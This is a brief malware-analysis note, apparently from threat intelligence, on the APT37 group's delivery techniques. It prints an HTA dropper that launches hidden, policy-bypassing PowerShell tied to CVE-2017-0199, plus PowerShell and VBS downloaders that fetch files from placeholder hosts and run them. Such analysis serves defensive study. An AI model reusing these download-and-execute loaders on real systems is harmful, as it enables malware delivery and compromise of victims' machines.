# APT37

## Features

1. Download and execute malicious HTA files using Microsoft Office vulnerability (CVE-2017-0199).

```hta
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type" />

<title>Bonjour</title>
<script language="VBScript">
Set owFrClN0giJ = CreateObject("Wscript.Shell")
Set v1ymUkaljYF = CreateObject("Scripting.FileSystemObject")
If v1ymUkaljYF.FileExists(owFrClN0giJ.ExpandEnvironmentStrings("%PSModulePath%") + "..\powershell.exe") Then
owFrClN0giJ.Run "powershell -nop -windowstyle hidden -executionpolicy bypass -encodedcommand [Base64 encryption command]" ,0
owFrClN0giJ.Run "cmd /c echo hta>%tmp%\webbrowser1094826604.tmp", 0
End If
Self.Close
</script>
<hta:application
id="oHTA"
applicationname="Bonjour"
application="yes"
>
</head>
</html>
```

The Base64 encrypted command will download and execute a Windows script and two malicious files after decryption.

```hta
$c=new-object System.Net.WebClient
$t =$env:temp
$t1=$t+"\\alitmp0131.jpg"
$t2=$t+"\\alitmp0132.jpg"
$t3=$t+"\\alitmp0133.js"

try
  {
    echo $c.DownloadFile( "http://domain/btob_asiana/appach01.jpg",$t1)
    $c.DownloadFile( "http://domain/btob_asiana/appach02.jpg",$t2)
    $c.DownloadFile( "http://domain/btob_asiana/udel_ok.ipp",$t3)
    wscript.exe $t3
  }
catch
  {
  }
```

2. When sending malicious software through VBS, multiple malicious files will be downloaded using the anti-aliasing PowerShell command.

```powershell
objShell.Run "cmd.exe /k powershell.exe" & " " & "-windowstyle" & " " & "hidden" & " " & "-ExecutionPolicy Bypass" & " " & "$h='%APPDATA%/Microsoft/Windows/msvcrt32.dll'" & ";" & "$f='%APPDATA%/Microsoft/ieConv.exe'" & ";" & "$x='" & "http://" & "Url" & "/UserFiles/File/image/images/happy.jpg" & "';" & "$t='" & "http://" & "Url" & "/UserFiles/File/image/images/wwwtest.jpg" & "';" & "(" & "New-Object System.Net.WebClient" & ")" & ".DownloadFile($t,$f)" & ";" & "(" & "New-Object System.Net.WebClient" & ")" & ".DownloadFile($x,$h)" & ";" & "Start-Process $f" & ";" & "Stop-Process" & " " & "-processname" & " " & "cmd", 0
```
